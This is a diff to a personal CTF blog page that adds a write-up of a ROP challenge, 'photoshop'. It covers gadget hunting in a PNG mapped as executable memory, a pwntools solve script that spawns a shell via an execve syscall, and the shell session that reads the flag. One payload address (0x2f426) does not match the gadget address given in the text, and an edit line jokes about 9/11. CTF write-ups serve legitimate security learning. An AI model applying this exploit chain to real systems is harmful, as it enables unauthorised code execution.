@@ -56,7 +56,8 @@ window.MathJax = {
 
 <p><a href="https://blog.azazo.me">azazo</a> and i did this ctf alongside one other friend. the event is long gone now but i decided to upsolve this python pwn challenge by <a href="https://samuzora.com">samuzora</a> that i thought was really fun. it took me about 8 hours.</p>
 
-<p><strong>edit 24th jan</strong> i also upsolved one of the unsolved revs, attached below</p>
+<p><strong>edit 24th jan</strong> i also upsolved one of the unsolved revs, attached below
+<strong>edit 25th feb</strong> a third sctf upsolve has hit the twin towers</p>
 
 <h3 id="pwnmutuple">pwn/mutuple</h3>
 
@@ -693,6 +694,195 @@ tuple size <span class="o">&gt;</span>  139899148097392
 
 <p>i think a better, more complete solve would completely unwind the obfuscation and have a nice control flow graph to look at instead of just rawdogging different blocks of asm via eyepower, i did want to learn some more tools / frameworks to get this done (if the binary was even more complicated, tracing manually and haphazardly like this would Not be feasible, you would need a more sophisticated approach. unfortunately this is not a level of sophistication i have :S)</p>
 
+<h3 id="pwnphotoshop">pwn/photoshop</h3>
+
+<blockquote>
+  <p>name: photoshop</p>
+
+  <p>author: Haowei</p>
+
+  <p>category: pwn</p>
+
+  <p>description: ‘The most cutting-edge image editing program’</p>
+</blockquote>
+
+<p>a lovely challenge by the IHSCHW (Indomitable Human Spirit Chen Haowei), took me around 40min to solve. as an aside its nice to see myself improving at this stuff, i dont think i could have ever solved this during the finals event so to make quick work of it now makes me Feel Good</p>
+
+<p>the plot is quite interesting, it’s a ROP chall with PIE enabled and no libc provided in the dist:</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">(</span><span class="n">base</span><span class="p">)</span> <span class="n">wrenches</span><span class="err">@</span><span class="n">kitty</span> <span class="p">(</span><span class="o">~/</span><span class="n">work</span><span class="o">/</span><span class="n">pwn</span><span class="o">/</span><span class="n">photoshop</span><span class="o">/</span><span class="n">dist</span><span class="p">)</span> <span class="o">&gt;</span> <span class="n">checksec</span> <span class="o">--</span><span class="n">file</span><span class="o">=</span><span class="n">photoshop</span>
+<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="err">'</span><span class="o">/</span><span class="n">home</span><span class="o">/</span><span class="n">wrenches</span><span class="o">/</span><span class="n">work</span><span class="o">/</span><span class="n">pwn</span><span class="o">/</span><span class="n">photoshop</span><span class="o">/</span><span class="n">dist</span><span class="o">/</span><span class="n">photoshop</span><span class="err">'</span>
+    <span class="n">Arch</span><span class="o">:</span>       <span class="n">amd64</span><span class="o">-</span><span class="mi">64</span><span class="o">-</span><span class="n">little</span>
+    <span class="n">RELRO</span><span class="o">:</span>      <span class="n">Partial</span> <span class="n">RELRO</span>
+    <span class="n">Stack</span><span class="o">:</span>      <span class="n">No</span> <span class="n">canary</span> <span class="n">found</span>
+    <span class="n">NX</span><span class="o">:</span>         <span class="n">NX</span> <span class="n">enabled</span>
+    <span class="n">PIE</span><span class="o">:</span>        <span class="n">PIE</span> <span class="n">enabled</span>
+    <span class="n">Stripped</span><span class="o">:</span>   <span class="n">No</span>
+    <span class="n">Debuginfo</span><span class="o">:</span>  <span class="n">Yes</span>
+</code></pre></div></div>
+
+<p>in the dist itself, we’re provided an <code class="language-plaintext highlighter-rouge">icon.png</code>, and the program <code class="language-plaintext highlighter-rouge">mprotect()</code>s  the entire file into r-x memory at a known offset (<code class="language-plaintext highlighter-rouge">0x10000</code>). super interesting! we’re essentially supposed to dig through a <code class="language-plaintext highlighter-rouge">.png</code> file for useful ROP gadgets. we’re also given exactly one byte within the <code class="language-plaintext highlighter-rouge">mprotect()ed</code> region that we can change.</p>
+
+<ul>
+  <li>i definitely think it’s solvable without using this one byte edit, but i ended up having to :(</li>
+</ul>
+
+<p>with a challenge like this, the challenge essentially boils down to getting the right idea, so a lot of creativity is required. the file provided is very large and there are a fuckload of gadgets, 99% of which are useless. how do we know what to do? i’ll walk through a few of my failed ideas before eventually getting to the correct one (a lot of the ideas end up not working because of a lack of gadgets).</p>
+
+<p>(obligatory shoutout to my pwn sensei and friend <a href="https://ndgsghdj.github.io/article/0.html">nikola</a> who solved this in an entirely different way via partial overwrite magic)</p>
+
+<h3 id="failed-idea-number-one-libc-ptr-in-rcx">failed idea number one: libc ptr in rcx</h3>
+
+<p>inspecting the contents of the registers <em>just</em> before our <code class="language-plaintext highlighter-rouge">ret</code> from the main instruction, we see that <code class="language-plaintext highlighter-rouge">rcx</code> is currently pointing to somewhere in libc.</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">gef</span><span class="o">&gt;</span> <span class="n">vmmap</span>
+<span class="p">[</span> <span class="n">Legend</span><span class="o">:</span> <span class="n">Code</span> <span class="o">|</span> <span class="n">Heap</span> <span class="o">|</span> <span class="n">Stack</span> <span class="o">|</span> <span class="n">Writable</span> <span class="o">|</span> <span class="n">ReadOnly</span> <span class="o">|</span> <span class="n">None</span> <span class="o">|</span> <span class="n">RWX</span> <span class="p">]</span>
+<span class="n">Start</span>              <span class="n">End</span>                <span class="n">Size</span>               <span class="n">Offset</span>             <span class="n">Perm</span> <span class="n">Path</span>
+<span class="mh">0x0000000000010000</span> <span class="mh">0x0000000000110000</span> <span class="mh">0x0000000000100000</span> <span class="mh">0x0000000000000000</span> <span class="n">r</span><span class="o">-</span><span class="n">x</span>
+<span class="p">...</span>
+<span class="p">[</span> <span class="n">the</span> <span class="n">region</span> <span class="n">below</span> <span class="n">is</span> <span class="n">where</span> <span class="n">rcx</span> <span class="n">points</span> <span class="n">to</span><span class="p">,</span> <span class="n">and</span> <span class="n">it</span> <span class="n">is</span> <span class="n">in</span> <span class="n">libc</span><span class="o">!</span> <span class="p">]</span>
+<span class="mh">0x00007ffff7dd3000</span> <span class="mh">0x00007ffff7f3b000</span> <span class="mh">0x0000000000168000</span> <span class="mh">0x0000000000028000</span> <span class="n">r</span><span class="o">-</span><span class="n">x</span> <span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">lib</span><span class="o">/</span><span class="n">x86_64</span><span class="o">-</span><span class="n">linux</span><span class="o">-</span><span class="n">gnu</span><span class="o">/</span><span class="n">libc</span><span class="p">.</span><span class="n">so</span><span class="p">.</span><span class="mi">6</span>  <span class="o">&lt;-</span>  <span class="err">$</span><span class="n">rcx</span>
+<span class="p">...</span>
+<span class="mh">0x00007ffff7ffd000</span> <span class="mh">0x00007ffff7ffe000</span> <span class="mh">0x0000000000001000</span> <span class="mh">0x0000000000036000</span> <span class="n">rw</span><span class="o">-</span> <span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">lib</span><span class="o">/</span><span class="n">x86_64</span><span class="o">-</span><span class="n">linux</span><span class="o">-</span><span class="n">gnu</span><span class="o">/</span><span class="n">ld</span><span class="o">-</span><span class="n">linux</span><span class="o">-</span><span class="n">x86</span><span class="o">-</span><span class="mi">64</span><span class="p">.</span><span class="n">so</span><span class="p">.</span><span class="mi">2</span>  <span class="o">&lt;-</span>  <span class="err">$</span><span class="n">r13</span>
+<span class="mh">0x00007ffff7ffe000</span> <span class="mh">0x00007ffff7fff000</span> <span class="mh">0x0000000000001000</span> <span class="mh">0x0000000000000000</span> <span class="n">rw</span><span class="o">-</span>
+<span class="mh">0x00007ffffffdd000</span> <span class="mh">0x00007ffffffff000</span> <span class="mh">0x0000000000022000</span> <span class="mh">0x0000000000000000</span> <span class="n">rw</span><span class="o">-</span> <span class="p">[</span><span class="n">stack</span><span class="p">]</span>  <span class="o">&lt;-</span>  <span class="err">$</span><span class="n">rsp</span><span class="p">,</span> <span class="err">$</span><span class="n">rbp</span><span class="p">,</span> <span class="err">$</span><span class="n">rsi</span><span class="p">,</span> <span class="err">$</span><span class="n">r14</span>
+</code></pre></div></div>
+
+<p>immediately i tried to think of ways to manipulate this pointer such that it points to <code class="language-plaintext highlighter-rouge">system()</code>. there are actually quite useful gadgets that allow us to do so, such as this <code class="language-plaintext highlighter-rouge">add</code> gadget:</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="mh">0x0000000000014429</span> <span class="o">:</span> <span class="n">add</span> <span class="n">ecx</span><span class="p">,</span> <span class="n">esi</span> <span class="p">;</span> <span class="n">ret</span>
+</code></pre></div></div>
+
+<p>accompanied with a <code class="language-plaintext highlighter-rouge">pop rsi ; ret</code> (sidenote, we basically have infinite register control, because <code class="language-plaintext highlighter-rouge">pop [] ; ret</code> is literally just two bytes), we can increment that pointer to point to <code class="language-plaintext highlighter-rouge">system()</code>, pop a <code class="language-plaintext highlighter-rouge">/bin/sh</code> ptr into <code class="language-plaintext highlighter-rouge">rdi</code> and win!</p>
+
+<p>where does this fuck up? no libc provided :( we don’t know any offsets. even so, we still have the issue of…</p>
+
+<h3 id="how-exactly-do-you-plan-to-pop-a-binsh-ptr-into-rdi">how exactly do you plan to ‘pop a /bin/sh ptr into rdi’</h3>
+
+<p>soooo uhh yeah. we can <em>write</em> /bin/sh to the stack, but we don’t actually know where the stack is. this took me quite a while to think about, and i think it is genuinely just a stroke of luck that i managed to figure this out. i will once again present the state of the registers just before our <code class="language-plaintext highlighter-rouge">ret</code>:</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">gef</span><span class="o">&gt;</span> <span class="n">info</span> <span class="n">registers</span>
+<span class="n">rax</span>            <span class="mh">0x0</span>                 <span class="mh">0x0</span>
+<span class="n">rbx</span>            <span class="mh">0x0</span>                 <span class="mh">0x0</span>
+<span class="n">rcx</span>            <span class="mh">0x7ffff7ea7277</span>      <span class="mh">0x7ffff7ea7277</span>
+<span class="n">rdx</span>            <span class="mh">0x0</span>                 <span class="mh">0x0</span>
+<span class="n">rsi</span>            <span class="mh">0x7fffffffda60</span>      <span class="mh">0x7fffffffda60</span>
+<span class="n">rdi</span>            <span class="mh">0x0</span>                 <span class="mh">0x0</span>
+<span class="n">rbp</span>            <span class="mh">0x7fffffffda80</span>      <span class="mh">0x7fffffffda80</span>
+<span class="n">rsp</span>            <span class="mh">0x7fffffffda60</span>      <span class="mh">0x7fffffffda60</span>
+</code></pre></div></div>
+
+<p>additionally, here is the assembly that actually calls the <code class="language-plaintext highlighter-rouge">read</code> instruction.</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="mh">0x00005555555553cd</span> <span class="o">&lt;+</span><span class="mi">516</span><span class="o">&gt;:</span>	<span class="n">lea</span>    <span class="n">rax</span><span class="p">,[</span><span class="n">rbp</span><span class="o">-</span><span class="mh">0x20</span><span class="p">]</span>
+<span class="mh">0x00005555555553d1</span> <span class="o">&lt;+</span><span class="mi">520</span><span class="o">&gt;:</span>	<span class="n">mov</span>    <span class="n">edx</span><span class="p">,</span><span class="mh">0x108</span>
+<span class="mh">0x00005555555553d6</span> <span class="o">&lt;+</span><span class="mi">525</span><span class="o">&gt;:</span>	<span class="n">mov</span>    <span class="n">rsi</span><span class="p">,</span><span class="n">rax</span>
+<span class="mh">0x00005555555553d9</span> <span class="o">&lt;+</span><span class="mi">528</span><span class="o">&gt;:</span>	<span class="n">mov</span>    <span class="n">edi</span><span class="p">,</span><span class="mh">0x0</span>
+<span class="mh">0x00005555555553de</span> <span class="o">&lt;+</span><span class="mi">533</span><span class="o">&gt;:</span>	<span class="n">call</span>   <span class="mh">0x555555555070</span> <span class="o">&lt;</span><span class="n">read</span><span class="err">@</span><span class="n">plt</span><span class="o">&gt;</span>
+<span class="mh">0x00005555555553e3</span> <span class="o">&lt;+</span><span class="mi">538</span><span class="o">&gt;:</span>	<span class="n">mov</span>    <span class="n">eax</span><span class="p">,</span><span class="mh">0x0</span>
+</code></pre></div></div>
+
+<p><code class="language-plaintext highlighter-rouge">rsi</code> is actually just a pointer to the beginning of the buffer we <code class="language-plaintext highlighter-rouge">read()</code> to (knowledge of calling conventions should make this obvious). so, if we just write <code class="language-plaintext highlighter-rouge">/bin/sh</code> with our <code class="language-plaintext highlighter-rouge">read()</code> call before writing the ROP chain proper, we can get <code class="language-plaintext highlighter-rouge">rsi</code> to point to <code class="language-plaintext highlighter-rouge">/bin/sh</code>. great! but rsi is not rdi. how do we turn rsi into rdi??</p>
+
+<h3 id="failed-idea-number-2-xchg">failed idea number 2: xchg</h3>
+
+<p>important context for x86 assembly: the only difference between a <code class="language-plaintext highlighter-rouge">mov rax</code>… and a <code class="language-plaintext highlighter-rouge">mov eax</code>… is that the <code class="language-plaintext highlighter-rouge">rax</code> instr has this <code class="language-plaintext highlighter-rouge">rex</code> prefix <code class="language-plaintext highlighter-rouge">0x48</code> appended to the beginning of the instruction:</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">gef</span><span class="o">&gt;</span> <span class="n">x</span><span class="o">/</span><span class="n">i</span> <span class="mh">0x0000555555555371</span>
+   <span class="mh">0x555555555371</span> <span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">424</span><span class="o">&gt;:</span>	<span class="n">add</span>    <span class="n">rax</span><span class="p">,</span><span class="n">rdx</span>
+<span class="n">gef</span><span class="o">&gt;</span> <span class="n">x</span><span class="o">/</span><span class="n">i</span> <span class="mh">0x0000555555555372</span>
+   <span class="mh">0x555555555372</span> <span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">425</span><span class="o">&gt;:</span>	<span class="n">add</span>    <span class="n">eax</span><span class="p">,</span><span class="n">edx</span>
+<span class="n">gef</span><span class="o">&gt;</span> <span class="n">x</span><span class="o">/</span><span class="mi">3</span><span class="n">x</span> <span class="mh">0x0000555555555371</span>
+<span class="mh">0x555555555371</span> <span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">424</span><span class="o">&gt;:</span>	<span class="mh">0x48</span>	<span class="mh">0x01</span>	<span class="mh">0xd0</span>
+</code></pre></div></div>
+
+<p>(conversely, the difference between <code class="language-plaintext highlighter-rouge">pop eax</code> and <code class="language-plaintext highlighter-rouge">pop rax</code> is that there is none, it just depends on whether your binary is 32-bit or 64-bit).</p>
+
+<p>given that we wanted to swap <code class="language-plaintext highlighter-rouge">rsi</code> and <code class="language-plaintext highlighter-rouge">rdi</code>, my brilliant idea was to use an <code class="language-plaintext highlighter-rouge">xchg</code> instruction - this is not an instruction you ever see used in ROP, ever, and i thought it would be super Auraful and cool. however, ROPgadget failed to find such a gadget. then, i further thought to use my one-byte write to add that <code class="language-plaintext highlighter-rouge">REX</code> prefix, but an <code class="language-plaintext highlighter-rouge">xchg edi, esi</code> gadget <em>does not exist</em> either! :(</p>
+
+<p>no dice.</p>
+
+<h3 id="failed-idea-number-3-chain-movs">failed idea number 3: chain movs</h3>
+
+<p>mov instructions are pretty common, but what is much less common is mov instructions that use the full 64-bit register (this is because of the prefix requirement above). there’s an abundance of <code class="language-plaintext highlighter-rouge">mov [], []</code>’s, in fact there’s even a <code class="language-plaintext highlighter-rouge">mov edi, esi</code>- the problem is that it is completely unusable:</p>
+
+<p><code class="language-plaintext highlighter-rouge">0x00000000000505d0 : mov edi, esi ; std ; sub byte ptr [rcx], ch ; ja 0x505ce ; pop rdx ; jmp 0x505bf</code></p>
+
+<p>if we wanted to make this a workable instruction we would need to append the <code class="language-plaintext highlighter-rouge">REX</code> prefix <em>and</em> insert a ret at the end. i was perhaps considering if there is some roundabout chain of <code class="language-plaintext highlighter-rouge">movs</code> that would allow us to perform the <code class="language-plaintext highlighter-rouge">mov rsi, rdi</code> (perhaps a <code class="language-plaintext highlighter-rouge">mov rdx, rsi</code>, then a <code class="language-plaintext highlighter-rouge">mov rdi, rdx</code>) - the problem is that this, once again, just does not exist in our file. :(</p>
+
+<h3 id="the-winning-idea-push--pop">the winning idea: push / pop</h3>
+
+<p>eventually i stumbled upon this gadget upon sheer luck (by grepping for <code class="language-plaintext highlighter-rouge">push rsi</code>)</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="mh">0x000000000001f422</span> <span class="o">:</span> 
+<span class="n">xchg</span> <span class="n">esp</span><span class="p">,</span> <span class="n">eax</span> <span class="p">;</span> <span class="n">cmp</span> <span class="n">ebp</span><span class="p">,</span> <span class="n">dword</span> <span class="n">ptr</span> <span class="p">[</span><span class="n">rdi</span><span class="p">]</span> <span class="p">;</span>
+<span class="n">stosb</span> <span class="n">byte</span> <span class="n">ptr</span> <span class="p">[</span><span class="n">rdi</span><span class="p">],</span> <span class="n">al</span> <span class="p">;</span> <span class="n">push</span> <span class="n">rsi</span> <span class="p">;</span> <span class="n">pop</span> <span class="n">rdi</span> <span class="p">;</span> <span class="n">jmp</span> <span class="mh">0x1f4a1</span>
+</code></pre></div></div>
+
+<p>so this looks hideously unusable but the key here is <code class="language-plaintext highlighter-rouge">push rsi, pop rdi</code>. this is literally <em>just</em> a <code class="language-plaintext highlighter-rouge">mov</code> also! it exists because <code class="language-plaintext highlighter-rouge">push / pop</code> don’t need that REX prefix, so this is literally just two contiguous bytes followed by a <code class="language-plaintext highlighter-rouge">jmp</code> so that ROPgadget picks it up.</p>
+
+<p>we can just use our one-byte write to add a <code class="language-plaintext highlighter-rouge">ret</code> to the end of this and win!</p>
+
+<h3 id="wait-how-do-you-even-win-we-still-dont-know-how-to-call-system">wait how do you even win we still don’t know how to call system()</h3>
+
+<p>okok so actually once you get pointers of arbitrary strings into <code class="language-plaintext highlighter-rouge">rdi</code> (arbitrary string-reference primitive, has this ever been said before?) this becomes trivial because of how many <code class="language-plaintext highlighter-rouge">pop</code> gadgets you have. i just did a <code class="language-plaintext highlighter-rouge">ret2syscall</code> - we pop the execve number into rax, and nulls into rsi and rdx. the solvescript ends up being super small, actually</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+
+<span class="n">elf</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s">"./photoshop"</span><span class="p">)</span>
+
+<span class="n">context</span><span class="p">.</span><span class="n">binary</span> <span class="o">=</span> <span class="n">elf</span>
+<span class="n">context</span><span class="p">.</span><span class="n">terminal</span> <span class="o">=</span> <span class="p">[</span><span class="s">"alacritty"</span><span class="p">,</span> <span class="s">"-e"</span><span class="p">,</span> <span class="s">"bash"</span><span class="p">,</span> <span class="s">"-c"</span><span class="p">]</span>
+
+<span class="n">edit</span> <span class="o">=</span> <span class="mh">0x1f428</span> <span class="c1"># push rsi ; pop rdi ; ret
+</span><span class="n">ret</span> <span class="o">=</span> <span class="mh">0xc3</span>
+
+<span class="c1">#p = process()
+</span><span class="n">p</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s">'172.17.0.2'</span><span class="p">,</span> <span class="mi">5000</span><span class="p">)</span>
+<span class="c1">#gdb.attach(p)
+</span>
+<span class="n">p</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">edit</span><span class="p">).</span><span class="n">encode</span><span class="p">())</span>
+<span class="n">p</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">ret</span><span class="p">).</span><span class="n">encode</span><span class="p">())</span>
+
+<span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="s">'/bin/sh</span><span class="se">\x00</span><span class="s">'</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="s">'A'</span> <span class="o">*</span> <span class="mh">0x20</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x2f426</span><span class="p">)</span> <span class="c1"># essentially a mov rdi, rsi
+</span><span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x33a7a</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x3b</span><span class="p">)</span> <span class="c1"># pop rax
+</span><span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x27ae6</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x00</span><span class="p">)</span> <span class="c1"># pop rsi
+</span><span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x15b60</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x00</span><span class="p">)</span> <span class="c1"># pop rdx
+</span><span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x1b850</span><span class="p">)</span> <span class="c1"># syscall
+</span>
+<span class="nb">input</span><span class="p">(</span><span class="s">'&gt; ...'</span><span class="p">)</span>
+<span class="n">p</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+<span class="n">p</span><span class="p">.</span><span class="n">interactive</span><span class="p">()</span>
+</code></pre></div></div>
+
+<p>this gives us our flag.</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">Welcome</span> <span class="n">to</span> <span class="n">the</span> <span class="n">best</span> <span class="n">image</span> <span class="n">editing</span> <span class="n">software</span><span class="o">!</span>
+<span class="n">Loading</span> <span class="n">image</span><span class="p">...</span>
+<span class="n">You</span> <span class="n">can</span> <span class="n">edit</span> <span class="n">one</span> <span class="n">pixel</span><span class="o">!</span>
+<span class="n">Enter</span> <span class="n">in</span> <span class="n">the</span> <span class="n">index</span> <span class="n">you</span> <span class="n">want</span> <span class="n">to</span> <span class="n">edit</span><span class="o">:</span> <span class="n">Enter</span> <span class="n">in</span> <span class="n">the</span> <span class="n">value</span><span class="o">:</span> <span class="n">Edit</span> <span class="n">successful</span><span class="o">!</span>
+<span class="n">Saving</span> <span class="n">image</span><span class="p">...</span>
+<span class="n">Enter</span> <span class="n">in</span> <span class="n">a</span> <span class="n">review</span><span class="o">?</span> <span class="err">$</span> <span class="n">ls</span> <span class="o">-</span><span class="n">alps</span>
+<span class="n">total</span> <span class="mi">404</span>
+  <span class="mi">4</span> <span class="n">drwxr</span><span class="o">-</span><span class="n">xr</span><span class="o">-</span><span class="n">x</span> <span class="mi">1</span> <span class="n">nobody</span> <span class="n">nogroup</span>   <span class="mi">4096</span> <span class="n">Feb</span> <span class="mi">24</span> <span class="mi">18</span><span class="o">:</span><span class="mi">33</span> <span class="p">.</span><span class="o">/</span>
+  <span class="mi">4</span> <span class="n">drwxr</span><span class="o">-</span><span class="n">xr</span><span class="o">-</span><span class="n">x</span> <span class="mi">1</span> <span class="n">nobody</span> <span class="n">nogroup</span>   <span class="mi">4096</span> <span class="n">Feb</span> <span class="mi">24</span> <span class="mi">18</span><span class="o">:</span><span class="mi">33</span> <span class="p">..</span><span class="o">/</span>
+  <span class="mi">4</span> <span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">r</span><span class="o">--</span> <span class="mi">1</span> <span class="n">nobody</span> <span class="n">nogroup</span>     <span class="mi">45</span> <span class="n">Feb</span> <span class="mi">24</span> <span class="mi">17</span><span class="o">:</span><span class="mi">14</span> <span class="n">flag</span><span class="p">.</span><span class="n">txt</span>
+<span class="mi">372</span> <span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">r</span><span class="o">--</span> <span class="mi">1</span> <span class="n">nobody</span> <span class="n">nogroup</span> <span class="mi">380516</span> <span class="n">Feb</span> <span class="mi">24</span> <span class="mi">17</span><span class="o">:</span><span class="mi">14</span> <span class="n">icon</span><span class="p">.</span><span class="n">png</span>
+ <span class="mi">20</span> <span class="o">-</span><span class="n">rwxrwxr</span><span class="o">-</span><span class="n">x</span> <span class="mi">1</span> <span class="n">nobody</span> <span class="n">nogroup</span>  <span class="mi">19240</span> <span class="n">Feb</span> <span class="mi">24</span> <span class="mi">17</span><span class="o">:</span><span class="mi">14</span> <span class="n">run</span>
+<span class="err">$</span> <span class="n">cat</span> <span class="n">flag</span><span class="p">.</span><span class="n">txt</span>
+<span class="n">sctf</span><span class="p">{</span><span class="n">credits_to_burner972021_for_all_the_art</span><span class="p">}</span><span class="err">$</span> <span class="n">exit</span>
+<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Got</span> <span class="n">EOF</span> <span class="k">while</span> <span class="n">reading</span> <span class="n">in</span> <span class="n">interactive</span>
+<span class="err">$</span> <span class="n">ls</span>
+<span class="err">$</span> 
+<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Interrupted</span>
+<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Closed</span> <span class="n">connection</span> <span class="n">to</span> <span class="mi">172</span><span class="p">.</span><span class="mi">17</span><span class="p">.</span><span class="mi">0</span><span class="p">.</span><span class="mi">2</span> <span class="n">port</span> <span class="mi">5000</span>
+</code></pre></div></div>
+
+<h3 id="closing-2">closing</h3>
+
+<p>honestly i love these dumb rop challenges, it requires a level of creativity that i dont typically get to exercise! congrats also to haowei for making the only non-libc given pwn that’s good</p>
 
 </article>
       </div>
